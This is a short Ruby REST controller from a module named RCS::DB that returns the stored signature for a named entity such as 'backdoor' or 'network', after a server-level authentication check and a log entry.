#
# Controller for the Signature objects
#

module RCS
module DB

class SignatureController < RESTController

  # retrieve the signature for a given entity
  # e.g. 'backdoor', 'network', ...
  def show
    require_auth_level :server

    sig = DB.signature params[:signature]
    
    trace :info, "[#{@req_peer}] Requested the '#{params[:signature]}' signature [#{sig[:sign]}]"

    return STATUS_OK, *json_reply(sig)
  end


end

end #DB::
end #RCS::
